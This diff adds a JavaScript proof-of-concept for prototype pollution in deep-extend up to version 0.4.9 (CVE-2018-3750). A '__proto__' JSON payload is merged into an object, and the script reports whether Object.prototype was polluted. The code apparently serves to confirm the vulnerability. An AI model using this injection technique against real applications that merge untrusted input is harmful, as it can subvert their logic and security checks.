@@ -1,0 +1,19 @@
+```javascript
+const deepExtend = require("deep-extend");
+
+// Prototype pollution via deep-extend <= 0.4.9 (CVE-2018-3750)
+// Merging attacker-controlled JSON (e.g. from a config file or request body)
+// pollutes Object.prototype because __proto__ keys are not filtered.
+const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+
+deepExtend({}, payload);
+
+const victim = {};
+console.log("victim.polluted =", victim.polluted); // "yes" -- Object.prototype was polluted
+
+if (victim.polluted === "yes") {
+  console.log("VULNERABLE: prototype pollution confirmed via deep-extend");
+} else {
+  console.log("not vulnerable");
+}
+```
